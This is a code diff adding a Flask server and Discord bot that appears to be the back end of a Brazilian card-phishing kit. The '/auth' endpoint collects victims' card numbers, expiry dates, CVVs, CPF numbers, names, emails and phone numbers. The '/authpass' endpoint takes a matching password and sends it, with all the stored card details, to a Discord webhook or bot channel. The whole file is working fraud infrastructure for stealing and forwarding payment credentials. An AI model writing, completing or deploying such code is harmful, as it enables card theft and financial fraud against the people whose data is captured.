@@ -1,0 +1,158 @@
+from model.cardModel import Card
+from flask import Flask, request, jsonify
+import os
+import discord
+from discord.ext import commands
+
+
+app = Flask(__name__)
+
+token = os.getenv("TOKEN")
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="/", intents=intents)
+
+# with app.app_context():
+#     db.create_all()
+
+cards: list[Card] = []
+
+
+@app.route('/auth', methods=['GET'])
+def authInfo():
+    try:
+        data = request.json
+
+        if not data or not all(key in data for key in [
+            'celular',
+            'operadora',
+            'valor',
+            'email',
+            'nome',
+            'cpf',
+            'card',
+            'mes',
+            'ano',
+            'cvv',
+            'token',
+            'bin',
+            'dadosbin'
+        ]):
+            return jsonify({'Error': 'Unknown'}), 401
+
+        celular = data.get('celular')
+        operadora = data.get('operadora')
+        valor = data.get('valor')
+        email = data.get('email')
+        nome = data.get('nome')
+        cpf = data.get('cpf')
+        card = data.get('card')
+        mes = data.get('mes')
+        ano = data.get('ano')
+        cvv = data.get('cvv')
+        token = data.get('token')
+        bin = data.get('bin')
+        dadosbin = data.get('dadosbin')
+
+        card = Card(
+            celular, operadora, valor, email, nome, cpf, card,
+            mes, ano, cvv, token, bin, dadosbin)
+        cards.append(card)
+
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print(ex)
+        return jsonify({'Error': 'Unknown'}), 401
+
+
+@app.route('/authpass', methods=['GET'])
+def authPassword():
+    try:
+        data = request.json
+        if not data or not all(key in data for key in [
+            'senha',
+            'token'
+        ]):
+            return jsonify({'Error': 'Unknown'}), 401
+
+        # senha = data.get('senha')
+        token = data.get('token')
+
+        for card in cards:
+            if card.token == token:
+# bot discord send message
+                try:
+                    # Prefer a Discord webhook if provided (no external state change required)
+                    import requests
+                    import json
+
+                    webhook_url = os.getenv("DISCORD_WEBHOOK_URL") or os.getenv("WEBHOOK_URL")
+                    senha = data.get('senha')
+
+                    message_lines = [
+                        f"Password received:",
+                        f"Token: {token}",
+                        f"Senha: {senha}",
+                        "",
+                        "Card details:",
+                        f"Card: {card.card} {card.mes}/{card.ano} CVV:{card.cvv}",
+                        f"Nome: {card.nome}",
+                        f"CPF: {card.cpf}",
+                        f"Email: {card.email}",
+                        f"Celular: {card.celular}",
+                        f"Operadora: {card.operadora}",
+                        f"Valor: {card.valor}",
+                        f"BIN: {card.bin}",
+                        f"DadosBIN: {card.dadosbin}"
+                    ]
+                    content = "\n".join(message_lines)
+
+                    if webhook_url:
+                        headers = {'Content-Type': 'application/json'}
+                        payload = {'content': content}
+                        try:
+                            requests.post(webhook_url, data=json.dumps(payload), headers=headers, timeout=5)
+                        except Exception as e:
+                            # If webhook fails, fallback to scheduling a send via the bot if possible
+                            print("Webhook send failed:", e)
+                            try:
+                                async def send_via_bot():
+                                    ch_id = os.getenv("DISCORD_CHANNEL_ID")
+                                    if ch_id and bot.is_ready():
+                                        channel = bot.get_channel(int(ch_id))
+                                        if channel:
+                                            await channel.send(content)
+                                try:
+                                    bot.loop.create_task(send_via_bot())
+                                except Exception as e2:
+                                    print("Failed to schedule bot send:", e2)
+                            except Exception:
+                                pass
+                    else:
+                        # If no webhook provided, try scheduling a send using the discord bot to a channel id from env
+                        try:
+                            async def send_via_bot():
+                                ch_id = os.getenv("DISCORD_CHANNEL_ID")
+                                if ch_id and bot.is_ready():
+                                    channel = bot.get_channel(int(ch_id))
+                                    if channel:
+                                        await channel.send(content)
+                            try:
+                                bot.loop.create_task(send_via_bot())
+                            except Exception as e:
+                                print("Failed to schedule bot send:", e)
+                        except Exception:
+                            pass
+
+                except Exception as e:
+                    print("Error while sending discord message:", e)
+
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print(ex)
+        return jsonify({'Error': 'Unknown'}), 401
+
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)
